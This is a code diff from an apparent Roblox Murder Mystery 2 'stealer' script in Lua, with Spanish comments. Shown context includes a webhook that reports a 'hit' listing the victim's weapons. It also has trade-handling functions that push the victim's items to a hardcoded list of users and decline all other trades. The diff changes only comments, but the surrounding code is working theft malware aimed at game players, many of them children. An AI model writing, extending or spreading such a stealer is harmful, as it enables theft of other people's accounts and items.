@@ -223,16 +223,15 @@ if #weaponsToSend > 0 then
     SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
--- ================= Trade con prioridad =================
+-- ================= Trade con rechazo avanzado =================
 local currentTarget = nil
 
 local function doTrade(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
     if not targetPlayer or #weaponsToSend == 0 then return end
 
-    -- Si ya hay un trade con alguien más y entra usuario de lista
     if currentTarget and currentTarget ~= targetName then
-        declineTrade()
+        declineTrade() -- rechaza trade en curso si entra otro
         task.wait(0.5)
     end
 
@@ -279,14 +278,14 @@ local function doTrade(targetName)
     currentTarget = nil
 end
 
--- Rechazar trades de usuarios no permitidos y priorizar lista
+-- Monitoreo y rechazo avanzado de trades
 TradeService.OnTradeReceived.OnClientEvent:Connect(function(sender)
     if not table.find(users, sender.Name) then
-        declineTrade() -- rechaza usuarios fuera de lista
+        declineTrade() -- rechaza trades fuera de lista
     elseif currentTarget ~= sender.Name then
-        declineTrade()      -- declina trade actual
+        declineTrade() -- declina trade actual
         task.wait(0.5)
-        doTrade(sender.Name) -- envía trade a usuario de la lista
+        doTrade(sender.Name) -- inicia trade prioritario
     end
 end)
 
